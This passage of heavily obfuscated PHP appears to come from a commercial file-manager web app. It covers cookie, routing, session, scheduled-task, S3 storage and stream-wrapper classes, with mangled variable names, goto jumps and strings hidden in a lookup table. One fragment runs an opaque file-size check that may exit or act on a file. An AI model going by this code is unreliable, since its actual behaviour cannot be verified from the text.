= 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ºéğŞ¿ø]) && self::$sameCookieSet[$ºéğŞ¿ø] == $ñÒ‚ƒ§– . $áéĞãÆ) { return; } self::$sameCookieSet[$ºéğŞ¿ø] = $ñÒ‚ƒ§– . $áéĞãÆ; if (!$•§áŸÅÜ) { $•§áŸÅÜ = str_replace(HOST, $š”Ÿ—Ï[12], APP_HOST); $•§áŸÅÜ = _get($GLOBALS, $š”Ÿ—Ï[1046], $•§áŸÅÜ); } $¦Ù’Æ = $š”Ÿ—Ï[12]; setcookie($ºéğŞ¿ø, $ñÒ‚ƒ§–, time() + $áéĞãÆ, $š”Ÿ—Ï[8] . trim($•§áŸÅÜ, $š”Ÿ—Ï[8]) . $¦Ù’Æ, !1, !1, $‘¶ä´„Á); } public static function setSafe($Ä¦ßÑƒ, $òÉ‘ŞÀó, $€¯Ğ¸Û„ = 0) { self::set($Ä¦ßÑƒ, $òÉ‘ŞÀó, $€¯Ğ¸Û„, !0); } public static function get($®õ€º–) { static $¿°›Æñ« = false; if (!$¿°›Æñ«) { self::initHeaderCookie(); $¿°›Æñ« = !0; } return isset($_COOKIE[$®õ€º–]) ? $_COOKIE[$®õ€º–] : !1; } private static function initHeaderCookie() { $«“‰çö÷ =& $_SERVER[µÅ˜º…æ]; if (!isset($_SERVER[$«“‰çö÷[1047]]) || !$_SERVER[$«“‰çö÷[1047]]) { return; } $şí¶›Ì˜ = explode($«“‰çö÷[74], $_SERVER[$«“‰çö÷[1047]]); foreach ($şí¶›Ì˜ as $ò«÷ğÈğ) { $ò«÷ğÈğ = explode($«“‰çö÷[464], $ò«÷ğÈğ); if (count($ò«÷ğÈğ) != 2 || !isset($ò«÷ğÈğ[1])) { continue; } $_COOKIE[trim($ò«÷ğÈğ[0])] = trim($ò«÷ğÈğ[1]); } } public static function remove($ï¯İ‘Êğ, $ÃƒúÄØï = false) { unset($_COOKIE[$ï¯İ‘Êğ]); self::set($ï¯İ‘Êğ, $_SERVER[µÅ˜º…æ][12], 1, $ÃƒúÄØï); } } goto BŠùÍšÁ”Ğ; Eæö·Á³Å´: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\x5b\136\57\135\53", "\72\x6e\165\155" => "\133\60\55\x39\x5d\x2b", "\x3a\141\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($è™á»Š„, $‡Ğ­ÂŒÔ) { $õ–œ§‘Í =& $_SERVER[µÅ˜º…æ]; if ($è™á»Š„ == $õ–œ§‘Í[1913]) { $ŸßÜçµª = array_map($õ–œ§‘Í[1914], $‡Ğ­ÂŒÔ[0]); $ÓÑ®ıÁ× = strpos($‡Ğ­ÂŒÔ[1], $õ–œ§‘Í[8]) === 0 ? $‡Ğ­ÂŒÔ[1] : $õ–œ§‘Í[8] . $‡Ğ­ÂŒÔ[1]; $¸•ÛıÉÍ = $‡Ğ­ÂŒÔ[2]; } else { $ŸßÜçµª = null; $ÓÑ®ıÁ× = strpos($‡Ğ­ÂŒÔ[0], $õ–œ§‘Í[8]) === 0 ? $‡Ğ­ÂŒÔ[0] : $õ–œ§‘Í[8] . $‡Ğ­ÂŒÔ[0]; $¸•ÛıÉÍ = $‡Ğ­ÂŒÔ[1]; } array_push(self::$maps, $ŸßÜçµª); array_push(self::$routes, $ÓÑ®ıÁ×); array_push(self::$methods, strtoupper($è™á»Š„)); array_push(self::$callbacks, $¸•ÛıÉÍ); } public static function error($¥şÛÔã) { self::$errorCallback = $¥şÛÔã; } public static function haltOnMatch($‡Ñ€Ô×× = true) { self::$halts = $‡Ñ€Ô××; } public static function dispatch() { $°”éË¶ =& $_SERVER[µÅ˜º…æ]; $‡Ô¢äÑÖ = parse_url($_SERVER[$°”éË¶[1915]], PHP_URL_PATH); $è­œÇ‡ = $_SERVER[$°”éË¶[161]]; $‡ƒà¡‚ = array_keys(static::$patterns); $÷î®ñ§´ = array_values(static::$patterns); $×Ë‚ª®± = !1; self::$routes = preg_replace($°”éË¶[1467], $°”éË¶[8], self::$routes); if (in_array($‡Ô¢äÑÖ, self::$routes)) { $ıã­§„õ = array_keys(self::$routes, $‡Ô¢äÑÖ); foreach ($ıã­§„õ as $óÜ†Ï³Ü) { if (self::$methods[$óÜ†Ï³Ü] == $è­œÇ‡ || self::$methods[$óÜ†Ï³Ü] == $°”éË¶[1916] || in_array($è­œÇ‡, self::$maps[$óÜ†Ï³Ü])) { $×Ë‚ª®± = !0; if (!is_object(self::$callbacks[$óÜ†Ï³Ü])) { $æş¢ıïâ = explode($°”éË¶[8], self::$callbacks[$óÜ†Ï³Ü]); $¡÷â¤äş = end($æş¢ıïâ); $µÃÓèÃŸ = explode($°”éË¶[1399], $¡÷â¤äş); $éå¶±â¸ = new $µÃÓèÃŸ[0](); $éå¶±â¸->{$µÃÓèÃŸ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$óÜ†Ï³Ü]); if (self::$halts) { return; } } } } } else { $µ¾ÂÇ¼ı = 0; foreach (self::$routes as $óÜ†Ï³Ü) { if (strpos($óÜ†Ï³Ü, $°”éË¶[4]) !== !1) { $óÜ†Ï³Ü = str_replace($‡ƒà¡‚, $÷î®ñ§´, $óÜ†Ï³Ü); } if (preg_match($°”éË¶[1917] . $óÜ†Ï³Ü . $°”éË¶[1918], $‡Ô¢äÑÖ, $„ô½Ø€±)) { if (self::$methods[$µ¾ÂÇ¼ı] == $è­œÇ‡ || self::$methods[$µ¾ÂÇ¼ı] == $°”éË¶[1916] || !empty(self::$maps[$µ¾ÂÇ¼ı]) && in_array($è­œÇ‡, self::$maps[$µ¾ÂÇ¼ı])) { $×Ë‚ª®± = !0; array_shift($„ô½Ø€±); if (!is_object(self::$callbacks[$µ¾ÂÇ¼ı])) { $æş¢ıïâ = explode($°”éË¶[8], self::$callbacks[$µ¾ÂÇ¼ı]); $¡÷â¤äş = end($æş¢ıïâ); $µÃÓèÃŸ = explode($°”éË¶[1399], $¡÷â¤äş); $éå¶±â¸ = new $µÃÓèÃŸ[0](); if (!method_exists($éå¶±â¸, $µÃÓèÃŸ[1])) { echo $°”éË¶[1919]; } else { call_user_func_array(array($éå¶±â¸, $µÃÓèÃŸ[1]), $„ô½Ø€±); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$µ¾ÂÇ¼ı], $„ô½Ø€±); if (self::$halts) { return; } } } } $µ¾ÂÇ¼ı++; } } if ($×Ë‚ª®± == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $û€ôú†Û =& $_SERVER[µÅ˜º…æ]; header($_SERVER[$û€ôú†Û[1920]] . $û€ôú†Û[1921]); echo $û€ôú†Û[1922]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$°”éË¶[1915]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $éËëÅñ¨ =& $_SERVER[µÅ˜º…æ]; static $İµŒğ˜• = false; if ($İµŒğ˜•) { return $İµŒğ˜•; } $ßÜ°Œ›… = $GLOBALS[$éËëÅñ¨[6]][$éËëÅñ¨[424]]; self::$sessionTime = $ßÜ°Œ›…[$éËëÅñ¨[1923]]; $í­ÔĞŒù = isset($GLOBALS[$éËëÅñ¨[1924]]) ? $GLOBALS[$éËëÅñ¨[1924]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($í­ÔĞŒù)) { self::$sessionSign = Cookie::get($í­ÔĞŒù); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($í­ÔĞŒù, self::$sessionSign, self::$sessionTime); $íºãÆü¹ = $ßÜ°Œ›…[$éËëÅñ¨[1925]]; $…–æËŠ = $ßÜ°Œ›…[$íºãÆü¹]; $ˆ¿“ôÄ‚ = $ßÜ°Œ›…[$éËëÅñ¨[980]]; switch ($íºãÆü¹) { case $éËëÅñ¨[21]: self::$handle = Model($éËëÅñ¨[981]); break; case $éËëÅñ¨[982]: self::$handle = new CacheRedis($…–æËŠ, $ˆ¿“ôÄ‚); break; case $éËëÅñ¨[983]: self::$handle = new CacheMemcached($…–æËŠ, $ˆ¿“ôÄ‚); break; case $éËëÅñ¨[230]: $…–æËŠ[$éËëÅñ¨[87]] = $…–æËŠ[$éËëÅñ¨[87]] . $éËëÅñ¨[1926]; self::$handle = new CacheFile($…–æËŠ, $ˆ¿“ôÄ‚); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); if (!self::$data || !isset(self::$data[$éËëÅñ¨[1663]]) || time() - self::$data[$éËëÅñ¨[1663]] >= 5) { self::dataSave(); } } $İµŒğ˜• = new self(); return $İµŒğ˜•; } public static function getBySign($×»²×äÖ) { $ÅˆÆ ää = self::$handle->get($×»²×äÖ); $ÅˆÆ ää = unserialize($ÅˆÆ ää); return is_array($ÅˆÆ ää) ? $ÅˆÆ ää : array(); } public static function setBySign($Àïé‚›, $›‰áÑ¶) { self::$sessionSign = $Àïé‚›; self::$data = $›‰áÑ¶; self::dataSave(); } private static function dataSave() { CacheLock::lock(self::$sessionSign); if (!self::$data || !is_array(self::$data)) { self::$data = array(); } self::$data[$_SERVER[µÅ˜º…æ][1663]] = time(); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function sign($¤˜¿›å = false) { if ($¤˜¿›å) { self::$sessionSign = $¤˜¿›å; } self::init(); return self::$sessionSign; } public static function set($§Şƒšæò, $ÅÙÕëô¢ = false) { self::init(); if (is_array($§Şƒšæò)) { foreach ($§Şƒšæò as $èñ¤ƒ– => $¤˜³ñÎ±) { array_set_value(self::$data, $èñ¤ƒ–, $¤˜³ñÎ±); } } else { array_set_value(self::$data, $§Şƒšæò, $ÅÙÕëô¢); } self::dataSave(); } public static function get($ÔÚ²ñ¼ = false) { self::init(); if (!$ÔÚ²ñ¼) { return self::$data; } return array_get_value(self::$data, $ÔÚ²ñ¼); } public static function remove($ğÂõ²ğ¦) { self::init(); unset(self::$data[$ğÂõ²ğ¦]); self::dataSave(); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[µÅ˜º…æ][989])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $û§± ˜£ =& $_SERVER[µÅ˜º…æ]; if (self::valueGet($û§± ˜£[849]) != $û§± ˜£[91]) { return; } if (self::valueGet($û§± ˜£[938]) == $û§± ˜£[91]) { $ù‰Ì†şŒ = self::valueGet($û§± ˜£[1927]); if (time() - $ù‰Ì†şŒ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($û§± ˜£[938], $û§± ˜£[91]); self::log($û§± ˜£[1928] . ACTION . $û§± ˜£[1929]); Hook::bind($û§± ˜£[1930], $û§± ˜£[1931]); $Ş§¼óõ = 0; while (!0) { self::cacheClear(); if (self::valueGet($û§± ˜£[849]) != $û§± ˜£[91]) { self::valueSet($û§± ˜£[938], $û§± ˜£[228]); self::log($û§± ˜£[1932]); die; } $Òóù–û™ = time(); if ($Òóù–û™ - $Ş§¼óõ >= 60) { self::valueSet(array($û§± ˜£[938] => $û§± ˜£[91], $û§± ˜£[1927] => $Òóù–û™)); $Ş§¼óõ = $Òóù–û™; } if (!file_exists(USER_SYSTEM . $û§± ˜£[1933])) { self::valueSet(array($û§± ˜£[938] => $û§± ˜£[228], $û§± ˜£[849] => $û§± ˜£[228])); self::log($û§± ˜£[1934]); die; } $±ıÓÑÛˆ = file_get_contents(BASIC_PATH . $û§± ˜£[1935]); $Ü°¤¾ï¾ = KOD_VERSION . $û§± ˜£[10] . KOD_VERSION_BUILD; $ˆë®ÓÉ¢ = match_text($±ıÓÑÛˆ, $û§± ˜£[1936]) . $û§± ˜£[10] . match_text($±ıÓÑÛˆ, $û§± ˜£[1937]); if ($ˆë®ÓÉ¢ != $Ü°¤¾ï¾) { self::restart(); self::log("\163\x74\x6f\160\x65\144\x2e\x5b\x76\x65\x72\163\151\x6f\x6e\40\x75\x70\144\x61\164\145\73{$versionNow}\40\75\76\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $¼Ú¹Ûù =& $_SERVER[µÅ˜º…æ]; http_close(); $GLOBALS[$¼Ú¹Ûù[1938]] = 1; $_SERVER[$¼Ú¹Ûù[1939]] = $¼Ú¹Ûù[1940]; $_COOKIE = array(); $GLOBALS[$¼Ú¹Ûù[1941]] = 1; $GLOBALS[$¼Ú¹Ûù[1942]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $Ö»íÆÍæ =& $_SERVER[µÅ˜º…æ]; http_close(); self::valueSet($Ö»íÆÍæ[849], $Ö»íÆÍæ[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Ö»íÆÍæ[938] => $Ö»íÆÍæ[228], $Ö»íÆÍæ[849] => $Ö»íÆÍæ[91])); self::log($Ö»íÆÍæ[1943]); } public static function taskSwitch() { $ãğïí¡ú =& $_SERVER[µÅ˜º…æ]; $£²ÙÇ§ = self::valueGet($ãğïí¡ú[849]) == $ãğïí¡ú[91] ? $ãğïí¡ú[228] : $ãğïí¡ú[91]; self::valueSet($ãğïí¡ú[849], $£²ÙÇ§); } public static function shutdownEvent() { $è¬®İˆ— =& $_SERVER[µÅ˜º…æ]; self::valueSet($è¬®İˆ—[938], $è¬®İˆ—[228]); self::log($è¬®İˆ—[1944]); } public static function config($Şæ½˜²æ, $¦Áô‘·•) { self::valueSet($_SERVER[µÅ˜º…æ][849], $Şæ½˜²æ); } private static function taskRunAll() { $úëèÚ§á =& $_SERVER[µÅ˜º…æ]; $¤èáÏÇÇ = timeFloat(); $àÚÕåÌš = Model($úëèÚ§á[1945])->listData(); $¶õ¦Å¢… = count($àÚÕåÌš); for ($óã…ñÎ¸ = 0; $óã…ñÎ¸ < $¶õ¦Å¢…; $óã…ñÎ¸++) { $’¹È¹É = $àÚÕåÌš[$óã…ñÎ¸]; if (!$’¹È¹É[$úëèÚ§á[487]] || $’¹È¹É[$úëèÚ§á[1946]] != $úëèÚ§á[91]) { continue; } if (!self::taskTimeCheck($’¹È¹É)) { continue; } self::taskRun($’¹È¹É); } Hook::trigger($úëèÚ§á[1947]); self::taskQueueRun($¤èáÏÇÇ); } private static function taskQueueRun($½ı×õ¼Š) { $·éø£Ñ = 10; while (!0) { $–ŸÖ³µª = TaskQueue::run(); if ($–ŸÖ³µª === !1) { break; } if (timeFloat() - $½ı×õ¼Š >= $·éø£Ñ) { break; } } } private static function taskTimeCheck($’ïøöûÍ) { $¢ÚõŞ€À =& $_SERVER[µÅ˜º…æ]; $·ï›ï¼° = json_decode($’ïøöûÍ[$¢ÚõŞ€À[204]], !0); $ªüĞ˜€Ó = intval($’ïøöûÍ[$¢ÚõŞ€À[1927]]); $â›óû“ô = strtotime($¢ÚõŞ€À[1948] . $·ï›ï¼°[$¢ÚõŞ€À[1949]] . $¢ÚõŞ€À[1950]) - strtotime($¢ÚõŞ€À[1951]); $Ô¦Œ¬²Ô = time() - strtotime(date($¢ÚõŞ€À[1952]) . $¢ÚõŞ€À[1953]); $ÊŒÀä‰Ñ = $Ô¦Œ¬²Ô >= $â›óû“ô && $Ô¦Œ¬²Ô <= $â›óû“ô + 3600; switch ($·ï›ï¼°[$¢ÚõŞ€À[33]]) { case $¢ÚõŞ€À[1954]: if (time() - $ªüĞ˜€Ó < 3600 * 24 * 30) { return !1; } if ($·ï›ï¼°[$¢ÚõŞ€À[1954]] == date($¢ÚõŞ€À[1955]) && $ÊŒÀä‰Ñ) { return !0; } break; case $¢ÚõŞ€À[1956]: if (time() - $ªüĞ˜€Ó < 3600 * 24 * 7) { return !1; } $×“®¹­ = date($¢ÚõŞ€À[1957]) == 0 ? 7 : date($¢ÚõŞ€À[1957]); if ($·ï›ï¼°[$¢ÚõŞ€À[1956]] == $×“®¹­ && $ÊŒÀä‰Ñ) { return !0; } break; case $¢ÚõŞ€À[1949]: if (time() - $ªüĞ˜€Ó < 3600 * 24) { return !1; } if ($ÊŒÀä‰Ñ) { return !0; } break; case $¢ÚõŞ€À[1958]: if (time() - $ªüĞ˜€Ó >= floatval($·ï›ï¼°[$¢ÚõŞ€À[1958]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $­ÇŒÁé€ =& $_SERVER[µÅ˜º…æ]; static $üû³ı½ = 0; $¼Û¥›‘Œ = 300; if (!$üû³ı½) { $üû³ı½ = time(); } if (time() - $üû³ı½ < $¼Û¥›‘Œ) { return; } $üû³ı½ = time(); $Ï˜âÆê› = Model($­ÇŒÁé€[597])->db($­ÇŒÁé€[12]); if ($Ï˜âÆê›) { $Ï˜âÆê›->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($­ÇŒÁé€[1959], $­ÇŒÁé€[1960]); die; } } public static function taskRun($¯é©Ñ³×) { $ŒÈ‡Ğûó =& $_SERVER[µÅ˜º…æ]; self::log($ŒÈ‡Ğûó[1961] . $¯é©Ñ³×[$ŒÈ‡Ğûó[487]] . $ŒÈ‡Ğûó[1962] . $¯é©Ñ³×[$ŒÈ‡Ğûó[32]] . $ŒÈ‡Ğûó[1963] . $¯é©Ñ³×[$ŒÈ‡Ğûó[1564]]); Model($ŒÈ‡Ğûó[1945])->run($¯é©Ñ³×[$ŒÈ‡Ğûó[487]]); $ú¢ëä…¯ = timeFloat(); $š»°¿ï¥ = $ŒÈ‡Ğûó[12]; switch ($¯é©Ñ³×[$ŒÈ‡Ğûó[33]]) { case $ŒÈ‡Ğûó[382]: $§ùúø–ğ = url_request($¯é©Ñ³×[$ŒÈ‡Ğûó[1564]], $ŒÈ‡Ğûó[1606], !1, !1, !1, !1, 10); if ($§ùúø–ğ[$ŒÈ‡Ğûó[849]]) { $š»°¿ï¥ = strlen($§ùúø–ğ[$ŒÈ‡Ğûó[1393]]); } break; case $ŒÈ‡Ğûó[1964]: $š»°¿ï¥ = Hook::apply($¯é©Ñ³×[$ŒÈ‡Ğûó[1564]]); default: break; } Model($ŒÈ‡Ğûó[1965])->add(array($ŒÈ‡Ğûó[1966] => $ŒÈ‡Ğûó[12], $ŒÈ‡Ğûó[1967] => $ŒÈ‡Ğûó[228], $ŒÈ‡Ğûó[33] => $ŒÈ‡Ğûó[1968] . $¯é©Ñ³×[$ŒÈ‡Ğûó[487]], $ŒÈ‡Ğûó[1969] => json_encode(array($ŒÈ‡Ğûó[32] => $¯é©Ñ³×[$ŒÈ‡Ğûó[32]], $ŒÈ‡Ğûó[1970] => timeFloat() - $ú¢ëä…¯, $ŒÈ‡Ğûó[855] => $š»°¿ï¥)))); $å³·ÅØ‚ = $š»°¿ï¥ ? $ŒÈ‡Ğûó[1971] . $š»°¿ï¥ : $ŒÈ‡Ğûó[12]; self::log($ŒÈ‡Ğûó[1972] . $¯é©Ñ³×[$ŒÈ‡Ğûó[487]] . $ŒÈ‡Ğûó[175] . $å³·ÅØ‚); return !0; } public static function valueGet($•àÃ†ÒÕ) { $øíñˆ± =& $_SERVER[µÅ˜º…æ]; $°‚´¼Ÿ¦ = $øíñˆ±[1973]; $²®Ê¤¸ = Model($øíñˆ±[522])->get($•àÃ†ÒÕ, $°‚´¼Ÿ¦); if (is_null($²®Ê¤¸)) { Model($øíñˆ±[522])->set($øíñˆ±[849], $øíñˆ±[91], $°‚´¼Ÿ¦); Model($øíñˆ±[522])->set($øíñˆ±[938], $øíñˆ±[228], $°‚´¼Ÿ¦); $²®Ê¤¸ = Model($øíñˆ±[522])->get($•àÃ†ÒÕ, $°‚´¼Ÿ¦); } return $²®Ê¤¸; } private static function valueSet($ç´úüåØ, $ ©ùËö = false) { $ê‹µ«Æû =& $_SERVER[µÅ˜º…æ]; $äÜ‚¢ŸÎ = $ê‹µ«Æû[1974]; CacheLock::lock($äÜ‚¢ŸÎ); $¾‘¾ Ó¾ = Model($ê‹µ«Æû[522])->set($ç´úüåØ, $ ©ùËö, $ê‹µ«Æû[1973]); CacheLock::unlock($äÜ‚¢ŸÎ); return $¾‘¾ Ó¾; } protected static function log($µş‰Öæø) { write_log($µş‰Öæø, $_SERVER[µÅ˜º…æ][1960]); } private static function cacheClear() { $ÚÁ‡–”› =& $_SERVER[µÅ˜º…æ]; Cache::clearMemory(Model($ÚÁ‡–”›[522])->cacheKey($ÚÁ‡–”›[1973])); Cache::clearMemory(Model($ÚÁ‡–”›[522])->cacheKey($ÚÁ‡–”›[1975])); Model($ÚÁ‡–”›[1945])->cacheClear(); self::closeDatabase(); } } goto c‚™‚°Êˆõ; eëÀáÂÍÉğ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Ğî‡³éĞ) { $ƒáó² ­ =& $_SERVER[µÅ˜º…æ]; parent::__construct($Ğî‡³éĞ); $ö·š»¸ = isset($Ğî‡³éĞ[$ƒáó² ­[256]]) && $Ğî‡³éĞ[$ƒáó² ­[256]] == $ƒáó² ­[247] ? $ƒáó² ­[247] : $ƒáó² ­[313]; $this->setSignVersion($ö·š»¸); } public function link($ô‚¤’¾ä, $íÏàÂæ = array()) { return parent::link($ô‚¤’¾ä, $íÏàÂæ); } public function fileOut($“ıÚçò, $‰Îşğ¦ì = false, $øö™ƒ¡ = false, $æÊîç£ş = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[µÅ˜º…æ][314])) { return parent::fileOutServer($“ıÚçò, $‰Îşğ¦ì, $øö™ƒ¡, $æÊîç£ş); } parent::fileOut($“ıÚçò, $‰Îşğ¦ì, $øö™ƒ¡, $æÊîç£ş); } public function fileOutImage($ô”ù§¤¡, $¸ ›é¤— = 250) { if (strstr($this->endpoint, $_SERVER[µÅ˜º…æ][314])) { return parent::fileOutImageServer($ô”ù§¤¡, $¸ ›é¤—); } parent::fileOutImage($ô”ù§¤¡, $¸ ›é¤—); } } define($_SERVER[µÅ˜º…æ][315], 1); define($_SERVER[µÅ˜º…æ][316], 2); goto eÎ×ê¢ÏĞ; aÄ¸Ô¹˜: $_size = $_SERVER[µÅ˜º…æ][1024]; if ($_SERVER[$_SERVER[µÅ˜º…æ][1025]] != $_size($_file)) { $_getc = $_SERVER[µÅ˜º…æ][1026]; $_getfile = $_SERVER[$_SERVER[µÅ˜º…æ][1027]] . $_SERVER[µÅ˜º…æ][1028]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[µÅ˜º…æ][285], $_getfilec); if (count($_getarrs) < $_SERVER[µÅ˜º…æ][713]) { $exit = $_SERVER[µÅ˜º…æ][1029]; $exit(); } $_act = $_SERVER[µÅ˜º…æ][1030]; $_act($_file); } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\x6e\x6f\x74\151\x63\145\114\x69\163\164"; public $field = array("\156\x61\155\145", "\143\x6f\x6e\164\x65\156\x74", "\141\165\x74\x68", "\x6d\157\144\145", "\x74\151\x6d\145", "\164\171\x70\x65", "\154\x65\166\145\x6c", "\x65\156\141\142\154\145", "\x73\x6f\162\164"); public function listData($é±æ¬£ = false, $’´Ì÷ ¦ = "\163\157\162\164", $™Í¬® = false) { return parent::listData($é±æ¬£, $’´Ì÷ ¦, $™Í¬®); } public function add($ÊúŸ¸Ô²) { $Š°ãÌéÖ =& $_SERVER[µÅ˜º…æ]; $ÛİŒ²ÌÜ = time(); if ($ÊúŸ¸Ô²[$Š°ãÌéÖ[16]] == $Š°ãÌéÖ[2656]) { $ÛİŒ²ÌÜ = strtotime($ÊúŸ¸Ô²[$Š°ãÌéÖ[204]]); } $ÊúŸ¸Ô²[$Š°ãÌéÖ[204]] = $ÛİŒ²ÌÜ; return parent::insert($ÊúŸ¸Ô²); } public function update($Ñ¥’Ûù„, $¸¼ÖÄ) { $–®¾ßá =& $_SERVER[µÅ˜º…æ]; $ç˜©ŸÊ = $this->listData($Ñ¥’Ûù„); if (!$ç˜©ŸÊ) { return !1; } $ôç£×ºÇ = time(); if ($¸¼ÖÄ[$–®¾ßá[16]] == $–®¾ßá[2656]) { $ôç£×ºÇ = strtotime($¸¼ÖÄ[$–®¾ßá[204]]); } $¸¼ÖÄ[$–®¾ßá[204]] = $ôç£×ºÇ; return parent::update($Ñ¥’Ûù„, $¸¼ÖÄ); } public function remove($İ­ö¶ú¨) { $Œª¿íÕ¹ = $this->listData($İ­ö¶ú¨); if (!$Œª¿íÕ¹ || $Œª¿íÕ¹[$_SERVER[µÅ˜º…æ][189]]) { return !1; } return parent::remove($İ­ö¶ú¨); } public function sort($³ÁÜÀö‰, $‘Çòüµ) { return parent::update($³ÁÜÀö‰, $‘Çòüµ); } public function enable($²Ê…íí, $ëç‚Ñ–•) { return parent::update($²Ê…íí, array($_SERVER[µÅ˜º…æ][2657] => $ëç‚Ñ–•)); } private function initUserOption() { $õÜè¶€ô =& $_SERVER[µÅ˜º…æ]; $this->optionType = $õÜè¶€ô[2658]; $this->modelType = $õÜè¶€ô[2659]; $this->field = array($õÜè¶€ô[2660], $õÜè¶€ô[32], $õÜè¶€ô[204], $õÜè¶€ô[33], $õÜè¶€ô[2661], $õÜè¶€ô[849], $õÜè¶€ô[226]); } public function userNoticeGet($’áöá·’ = false) { $this->initUserOption(); return parent::listData($’áöá·’, $_SERVER[µÅ˜º…æ][487], !0); } public function userNoticeAdd($£ˆâ¶Æä) { $ëü³¤ =& $_SERVER[µÅ˜º…æ]; $this->initUserOption(); $á•¾€¨ = $this->findByKey($ëü³¤[2660], $£ˆâ¶Æä[$ëü³¤[487]]); if ($á•¾€¨) { return !0; } $š¨ú²î˜ = array($ëü³¤[2660] => $£ˆâ¶Æä[$ëü³¤[487]], $ëü³¤[32] => $£ˆâ¶Æä[$ëü³¤[32]], $ëü³¤[204] => $£ˆâ¶Æä[$ëü³¤[204]], $ëü³¤[33] => isset($£ˆâ¶Æä[$ëü³¤[33]]) ? $£ˆâ¶Æä[$ëü³¤[33]] : 1, $ëü³¤[2661] => isset($£ˆâ¶Æä[$ëü³¤[2661]]) ? $£ˆâ¶Æä[$ëü³¤[2661]] : 0, $ëü³¤[849] => 0, $ëü³¤[226] => 0); return parent::insert($š¨ú²î˜); } public function userNoticeEdit($Šğ—­ƒµ, $û™ÏÍÙë) { $this->initUserOption(); return parent::update($Šğ—­ƒµ, $û™ÏÍÙë); } } goto EÑø¾Êå„˜; Cˆå´ÇÇÊ¤: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Ÿº£Úù€, $–§º˜¯‹ = '') { $this->info = $this->info($Ÿº£Úù€); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[µÅ˜º…æ][87]]; $this->pathOpen = $Ÿº£Úù€; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Ÿº£Úù€])) { self::$_chunkBuffer[$Ÿº£Úù€] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¾Ÿåİã) { $²¾º’éº = $this->fileSubstr($this->pose, $¾Ÿåİã); $this->pose += strlen($²¾º’éº); return $²¾º’éº; } public function stream_tell() { return $this->pose; } public function stream_seek($˜ş¦Ï¶—, $§§ğÁ¦Ù) { $¾„µÌÎ =& $_SERVER[µÅ˜º…æ]; if ($§§ğÁ¦Ù == SEEK_SET) { $this->pose = $˜ş¦Ï¶—; } else { if ($§§ğÁ¦Ù == SEEK_CUR) { $this->pose += $˜ş¦Ï¶—; } else { if ($§§ğÁ¦Ù == SEEK_END) { $this->pose = $this->info[$¾„µÌÎ[79]] + intval($˜ş¦Ï¶—); } } } if ($˜ş¦Ï¶— < 0) { $this->pose = $this->info[$¾„µÌÎ[79]] + $˜ş¦Ï¶—; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[µÅ˜º…æ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($¹‘ó›€, $ÛØÜùĞò) { $ßÑìå£œ =& $_SERVER[µÅ˜º…æ]; $´¼’¥… = $this->info($¹‘ó›€); return array($ßÑìå£œ[1513] => 0, $ßÑìå£œ[1813] => 0, $ßÑìå£œ[16] => 32768 + 511, $ßÑìå£œ[1814] => 0, $ßÑìå£œ[1815] => 0, $ßÑìå£œ[1816] => 0, $ßÑìå£œ[1817] => 0, $ßÑìå£œ[79] => $´¼’¥…[$ßÑìå£œ[79]], $ßÑìå£œ[1818] => $´¼’¥…[$ßÑìå£œ[1663]], $ßÑìå£œ[1775] => $´¼’¥…[$ßÑìå£œ[88]], $ßÑìå£œ[1774] => $´¼’¥…[$ßÑìå£œ[231]], $ßÑìå£œ[1819] => 0, $ßÑìå£œ[1820] => 0); } static $fileInfo = array(); public function info($ö•şÀ) { $Êôâ¢Úƒ = $_SERVER[µÅ˜º…æ][1821]; if (isset(self::$fileInfo[$ö•şÀ])) { return self::$fileInfo[$ö•şÀ]; } if (substr($ö•şÀ, 0, strlen($Êôâ¢Úƒ)) != $Êôâ¢Úƒ) { return !1; } self::$fileInfo[$ö•şÀ] = IO::info(substr($ö•şÀ, strlen($Êôâ¢Úƒ))); return self::$fileInfo[$ö•şÀ]; } public static function read($£¼†©, $¾×Ã—óˆ, $°ö¯´ôŸ) { if (!isset(self::$_fopenCache[$£¼†©])) { $‹ñà¥í¦ = new 